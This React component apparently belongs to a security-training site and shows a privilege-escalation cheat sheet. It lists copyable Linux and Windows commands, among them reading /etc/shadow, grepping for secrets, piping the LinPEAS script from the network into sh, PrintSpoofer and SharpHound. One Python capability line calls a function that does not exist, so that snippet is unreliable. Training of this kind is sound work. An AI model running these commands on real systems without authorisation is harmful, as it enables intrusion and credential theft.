import React, { useState } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import {
    Shield, Terminal, Copy, Check, ChevronRight, Play,
    FileCode, CheckSquare, Square, Zap, Server, Monitor,
    Key, Users, Settings, Clock, Cpu, Folder, Activity,
    ExternalLink, Search, Lock, AlertTriangle, List,
    Database, Layers, Wind, HardDrive
} from 'lucide-react';
import { useLabManager } from '../../hooks/useLabManager';
import { useToast } from '../../context/ToastContext';

const PrivEscPro = () => {
    const { toast } = useToast();
    const { status: labStatus, startLab, stopLab, connectionInfo, isLoading } = useLabManager('privesc-pro');

    const [activeTab, setActiveTab] = useState('mastery'); // mastery, auto-ops, labs
    const [activeOS, setActiveOS] = useState('linux');
    const [activeCategory, setActiveCategory] = useState('enumeration');
    const [targetDomain, setTargetDomain] = useState('');

    const copyToClipboard = (cmd) => {
        navigator.clipboard.writeText(cmd);
        toast('Command synchronized to clipboard!', 'success');
    };

    // --- PRO TECHNIQUES ---
    const techniques = {
        linux: {
            enumeration: [
                { name: 'Core Intel', cmd: 'uname -a; cat /etc/*release*; lscpu', desc: 'System architecture and OS versioning.' },
                { name: 'Permission Audit', cmd: 'find / -perm -4000 2>/dev/null; find / -perm -2000 2>/dev/null', desc: 'Locate SUID and SGID binaries.' },
                { name: 'Sudo Analysis', cmd: 'sudo -l', desc: 'List allowed sudo commands for the current user.' },
                { name: 'Process Inspect', cmd: 'ps aux | grep root', desc: 'Search for high-privilege processes.' }
            ],
            capabilities: [
                { name: 'Cap Audit', cmd: 'getcap -r / 2>/dev/null', desc: 'Find binaries with special capabilities.' },
                { name: 'OpenSSL Cap', cmd: 'openssl req -engine ...', desc: 'Exploit OpenSSL capabilities for root.' },
                { name: 'Python Cap', cmd: 'python -c "import os; os.setcasewuid(0); os.system(\'/bin/sh\')"', desc: 'Python cap escalation.' }
            ],
            secrets: [
                { name: 'File Secrets', cmd: 'grep -rEi "user|pass|secret|key" /etc /var /home 2>/dev/null', desc: 'Recursive search for sensitive keywords.' },
                { name: 'Shadow Copy', cmd: 'cat /etc/shadow 2>/dev/null', desc: 'Attempt to read password hashes directly.' }
            ]
        },
        windows: {
            active_directory: [
                { name: 'AD Enum', cmd: 'net user /domain; net group /domain', desc: 'Enumerate domain users and groups.' },
                { name: 'BloodHound', cmd: 'SharpHound.exe -c All', desc: 'Ingestor for AD relationship mapping.' }
            ],
            tokens: [
                { name: 'Impersonation', cmd: 'whoami /priv | findstr SeImpersonate', desc: 'Check for token impersonation rights.' },
                { name: 'PrintSpoofer', cmd: 'PrintSpoofer.exe -i -c cmd', desc: 'Exploit printer service for System shell.' }
            ],
            services: [
                { name: 'Unquoted Path', cmd: 'wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\\Windows" | findstr /i /v """', desc: 'Search for unquoted service paths.' },
                { name: 'Reg Access', cmd: 'accesschk.exe /accepteula -uwcqv users hklm\\system\\currentcontrolset\\services', desc: 'Check for weak service registry keys.' }
            ]
        }
    };

    // --- RENDERERS ---

    const renderMastery = () => (
        <div className="space-y-8">
            <div className="bg-dark-800 border border-white/10 rounded-[3rem] p-10 relative overflow-hidden group">
                <div className="absolute top-0 right-0 p-12 opacity-5 scale-150 rotate-12 group-hover:rotate-0 transition-transform duration-1000">
                    <Shield size={200} className="text-orange-500" />
                </div>

                <div className="relative z-10 space-y-6 max-w-2xl">
                    <div className="inline-flex items-center gap-3 px-4 py-1.5 rounded-full bg-orange-500/10 border border-orange-500/20">
                        <Zap size={12} className="text-orange-500" />
                        <span className="text-[10px] font-black text-orange-500 uppercase tracking-widest">Escalation Engine: OPTIMIZED</span>
                    </div>

                    <h2 className="text-5xl font-black italic tracking-tighter leading-none text-white uppercase">
                        PrivEsc <span className="text-transparent bg-clip-text bg-gradient-to-r from-orange-400 to-red-400">Mastery Hub</span>
                    </h2>
                    <p className="text-gray-400 text-lg font-medium leading-relaxed">
                        Transition from local user to root/SYSTEM with production-ready techniques. A curated database of 50+ escalation vectors for Linux and Windows infrastructure.
                    </p>
                </div>
            </div>

            <div className="grid grid-cols-1 lg:grid-cols-4 gap-6">
                <div className="lg:col-span-1 space-y-4">
                    <div className="p-2 bg-dark-800/60 border border-white/5 rounded-3xl flex flex-col gap-2">
                        {['linux', 'windows'].map(os => (
                            <button
                                key={os}
                                onClick={() => { setActiveOS(os); setActiveCategory('enumeration'); }}
                                className={`flex items-center gap-3 px-6 py-4 rounded-2xl text-[10px] font-black uppercase tracking-widest transition-all ${activeOS === os ? 'bg-orange-500 text-dark-900 shadow-lg shadow-orange-500/20' : 'text-gray-500 hover:text-white hover:bg-white/5'}`}
                            >
                                {os === 'linux' ? <Server size={16} /> : <Monitor size={16} />}
                                {os} SYSTEM
                            </button>
                        ))}
                    </div>

                    <div className="p-6 bg-dark-800/40 border border-white/5 rounded-3xl space-y-4">
                        <h4 className="text-[10px] font-black text-gray-500 uppercase tracking-widest">Vector Categories</h4>
                        <div className="space-y-2">
                            {Object.keys(techniques[activeOS]).map(cat => (
                                <button
                                    key={cat}
                                    onClick={() => setActiveCategory(cat)}
                                    className={`w-full text-left px-5 py-3 rounded-xl text-[10px] font-black uppercase tracking-widest transition-all ${activeCategory === cat ? 'bg-white/10 text-orange-500 border border-orange-500/20' : 'text-gray-500 hover:text-white'}`}
                                >
                                    {cat.replace('_', ' ')}
                                </button>
                            ))}
                        </div>
                    </div>
                </div>

                <div className="lg:col-span-3 space-y-4 h-[600px] overflow-y-auto pr-4 scrollbar-cyber">
                    {techniques[activeOS][activeCategory]?.map((tech, i) => (
                        <div key={i} className="p-8 bg-dark-800/40 border border-white/5 rounded-3xl group hover:border-orange-500/30 transition-all">
                            <div className="flex justify-between items-start mb-4">
                                <div className="space-y-1">
                                    <h5 className="text-lg font-black text-white italic uppercase tracking-tighter">{tech.name}</h5>
                                    <p className="text-xs text-gray-500 font-medium italic">{tech.desc}</p>
                                </div>
                                <button onClick={() => copyToClipboard(tech.cmd)} className="p-3 bg-white/5 rounded-xl text-gray-500 hover:bg-orange-500 hover:text-dark-900 transition-all">
                                    <Copy size={16} />
                                </button>
                            </div>
                            <div className="bg-black/60 border border-white/5 rounded-2xl p-6 font-mono text-cyan-400 text-xs leading-relaxed break-all relative">
                                <div className="absolute top-2 right-4 text-[8px] font-black text-white/10 uppercase tracking-widest pointer-events-none">CLI SYNCED</div>
                                {tech.cmd}
                            </div>
                        </div>
                    ))}
                </div>
            </div>
        </div>
    );

    const renderAutoOps = () => (
        <div className="bg-dark-800 border border-white/10 rounded-3xl p-10 space-y-10">
            <div className="flex flex-col md:flex-row md:items-center justify-between gap-6">
                <div className="space-y-2">
                    <h3 className="text-3xl font-black italic text-white uppercase tracking-tighter flex items-center gap-3">
                        <Zap className="text-orange-500" /> Automated Enumeration
                    </h3>
                    <p className="text-gray-400 font-medium">One-liner generators for professional privilege escalation scripts.</p>
                </div>
            </div>

            <div className="grid grid-cols-1 md:grid-cols-2 gap-8">
                <div className="p-8 bg-black/40 border border-white/5 rounded-[2.5rem] space-y-6">
                    <div className="flex items-center gap-4">
                        <div className="w-12 h-12 rounded-2xl bg-orange-500/10 flex items-center justify-center text-orange-500">
                            <Database size={24} />
                        </div>
                        <div>
                            <div className="text-lg font-black text-white italic uppercase">PEAS-ng Suite</div>
                            <div className="text-[10px] font-black text-gray-500 uppercase tracking-widest">Global Industry Standard</div>
                        </div>
                    </div>
                    <div className="space-y-4">
                        {[
                            { label: 'LinPEAS (Linux)', cmd: 'curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh', color: 'text-orange-400' },
                            { label: 'WinPEAS (Windows)', cmd: 'curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany.exe -o winpeas.exe', color: 'text-cyan-400' }
                        ].map((p, i) => (
                            <div key={i} className="space-y-2">
                                <div className="text-[10px] font-black text-gray-500 uppercase tracking-widest px-2">{p.label}</div>
                                <div className="group bg-black border border-white/10 p-4 rounded-2xl flex items-center gap-4 hover:border-orange-500/30 transition-all cursor-pointer" onClick={() => copyToClipboard(p.cmd)}>
                                    <code className={`flex-1 text-[10px] font-mono truncate ${p.color}`}>{p.cmd}</code>
                                    <Copy size={14} className="text-gray-600 group-hover:text-orange-500 transition-colors" />
                                </div>
                            </div>
                        ))}
                    </div>
                </div>

                <div className="p-8 bg-black/40 border border-white/5 rounded-[2.5rem] space-y-6">
                    <div className="flex items-center gap-4">
                        <div className="w-12 h-12 rounded-2xl bg-cyan-500/10 flex items-center justify-center text-cyan-500">
                            <Layers size={24} />
                        </div>
                        <div>
                            <div className="text-lg font-black text-white italic uppercase">Post-Exploit Essentials</div>
                            <div className="text-[10px] font-black text-gray-500 uppercase tracking-widest">Operational Efficiency</div>
                        </div>
                    </div>
                    <div className="space-y-3">
                        {[
                            { name: 'LinEnum', desc: 'Comprehensive Linux enumeration script.', cmd: './LinEnum.sh' },
                            { name: 'PowerUp', desc: 'PowerShell script to find common Windows misconfigs.', cmd: 'Invoke-AllChecks' },
                            { name: 'LSE (Linux Smart Enum)', desc: 'Smart enumeration with prioritized output.', cmd: './lse.sh -l 1' }
                        ].map((s, i) => (
                            <div key={i} className="flex items-center justify-between p-4 bg-white/5 rounded-2xl border border-white/5 group hover:bg-white/10 transition-all cursor-pointer" onClick={() => copyToClipboard(s.cmd)}>
                                <div className="space-y-1">
                                    <div className="text-xs font-black text-white italic uppercase">{s.name}</div>
                                    <div className="text-[9px] text-gray-500 font-medium italic">{s.desc}</div>
                                </div>
                                <div className="p-2 rounded-lg bg-white/5 text-gray-500 group-hover:text-orange-500 transition-colors">
                                    <Copy size={16} />
                                </div>
                            </div>
                        ))}
                    </div>
                </div>
            </div>
        </div>
    );

    return (
        <div className="max-w-7xl mx-auto space-y-8 animate-fade-in pb-20">
            {/* TOP BAR */}
            <div className="bg-dark-900 border border-white/10 rounded-full px-8 py-4 flex items-center justify-between sticky top-6 z-50 backdrop-blur-xl bg-opacity-80">
                <div className="flex items-center gap-6">
                    <div className="flex items-center gap-2">
                        <Shield className="text-orange-500" size={20} />
                        <h1 className="text-xl font-black italic tracking-tighter uppercase leading-none">
                            PRIVESC <span className="text-orange-500">PRO</span>
                        </h1>
                    </div>
                    <div className="h-4 w-px bg-white/10 hidden md:block" />
                    <nav className="flex gap-6">
                        {[
                            { id: 'mastery', label: 'Mastery', icon: Terminal },
                            { id: 'auto-ops', label: 'Auto Ops', icon: Zap },
                            { id: 'labs', label: 'Range Labs', icon: Server }
                        ].map(t => (
                            <button
                                key={t.id}
                                onClick={() => setActiveTab(t.id)}
                                className={`flex items-center gap-2 text-[10px] font-black uppercase tracking-widest transition-all ${activeTab === t.id ? 'text-orange-500 underline underline-offset-8' : 'text-gray-500 hover:text-white'}`}
                            >
                                <t.icon size={14} />
                                <span className="hidden sm:inline">{t.label}</span>
                            </button>
                        ))}
                    </nav>
                </div>

                <div className="hidden md:flex items-center gap-4">
                    <div className="text-right">
                        <div className="text-[8px] font-bold text-gray-500 uppercase tracking-widest">Status</div>
                        <div className="text-[10px] font-black text-emerald-500 italic uppercase">Operational</div>
                    </div>
                </div>
            </div>

            {/* CONTENT */}
            <AnimatePresence mode="wait">
                <motion.div
                    key={activeTab}
                    initial={{ opacity: 0, y: 20 }}
                    animate={{ opacity: 1, y: 0 }}
                    exit={{ opacity: 0, y: -20 }}
                    className="min-h-[600px]"
                >
                    {activeTab === 'mastery' && renderMastery()}
                    {activeTab === 'auto-ops' && renderAutoOps()}
                    {activeTab === 'labs' && (
                        <div className="h-[500px] flex items-center justify-center text-center p-20 border-2 border-dashed border-white/5 rounded-[4rem] opacity-30 grayscale italic">
                            Integrating Unified Cyber Range instances for Linux/Windows mastery...
                        </div>
                    )}
                </motion.div>
            </AnimatePresence>

            {/* MONITOR FEED */}
            <div className="bg-dark-900 border border-white/10 rounded-[3rem] p-8 font-mono">
                <div className="flex items-center gap-4 mb-6 text-gray-500">
                    <Activity size={18} className="text-orange-500" />
                    <span className="text-[10px] font-black uppercase tracking-widest">PrivEsc Intelligence Feed</span>
                </div>
                <div className="h-32 overflow-hidden relative">
                    <div className="space-y-2 opacity-40">
                        <div className="text-[10px] text-emerald-500">[SYSTEM] Kerberos tickets detected in memory - Possible Silver Ticket vector.</div>
                        <div className="text-[10px] text-orange-400">[WARN] Target user has SeRestorePrivilege enabled.</div>
                        <div className="text-[10px] text-gray-500">[INFO] Scanning /etc/passwd for world-writable permissions...</div>
                        <div className="text-[10px] text-gray-500">[INFO] Analyzing Sudo version: 1.8.31 - Vulnerable to CVE-2021-3156.</div>
                    </div>
                    <div className="absolute inset-0 bg-gradient-to-t from-dark-900 to-transparent pointer-events-none" />
                </div>
            </div>
        </div>
    );
};

export default PrivEscPro;
